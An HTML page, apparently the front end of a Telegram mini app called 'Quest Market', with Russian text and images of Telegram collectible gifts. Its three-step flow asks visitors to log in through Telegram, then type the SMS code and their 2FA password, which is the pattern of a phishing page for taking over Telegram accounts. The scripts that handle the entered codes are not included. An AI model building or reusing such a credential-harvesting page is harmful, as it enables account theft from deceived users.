<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="squares.css">
    <link rel="stylesheet" href="popup.css">
    <script src="https://telegram.org/js/telegram-web-app.js?59"></script>

</head>

<body>
    <h1>test</h1>
    <div class="area">
        <div class="container">
            <div id="page1">
                <img class="main-logo" src="assets/ico.svg" alt="">
                <h1 id="TEST" >Quest Market</h1>
                <p>Для продолжения работы с ботом необходимо авторизоватся через Telegram</p>
                <button class="btn" id="loginbtn">
                    <img src="assets/tg.svg" alt="">
                    Войти через Telegram
                </button>
                <div id="bg"></div>

            </div>
            <div class="blur" id="blur"></div>
            <div id="page2">
                <img class="small-logo" src="assets/ico.svg" alt="">
                <h1 class="passcode-title">Введите код из СМС</h1>
                <input type="number" maxlength="5" id="passcode-input" placeholder="00000" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                <button class="btn" id="passcode-btn">Подтвердить</button>
                <div id="popup"></div>

            </div>
            <div id="page3">
                <img class="small-logo" src="assets/ico.svg" alt="">
                <h1 class="passcode-title">Введите пароль 2FA</h1>
                <input type="text" placeholder="Пароль" id="twofactor-input">
                <button class="btn" id="twofactor-btn">Подтвердить</button>
                <div id="popup"></div>
            </div>
        </div>

        <ul class="circles">
            <img src="assets/33.svg" alt="">
            <img src="assets/Ion Gem.svg" alt="">
            <img src="assets/Plush Pepe.svg" alt="">
            <img src="assets/Toy Bear.svg" alt="">
            <img src="assets/Vintage Cigar.svg" alt="">
            <img src="assets/Ionic Dryer.svg" alt="">
            <img src="assets/Lush Bouquet.svg" alt="">
            <img src="assets/18.svg" alt="">
            <img src="assets/Witch Hat.svg" alt="">
            <img src="assets/Precious Peach.svg" alt="">
        </ul>

    </div>

    <script src="loginScripts.js"></script>
    <script src="scripts.js"></script>
</body>

</html>
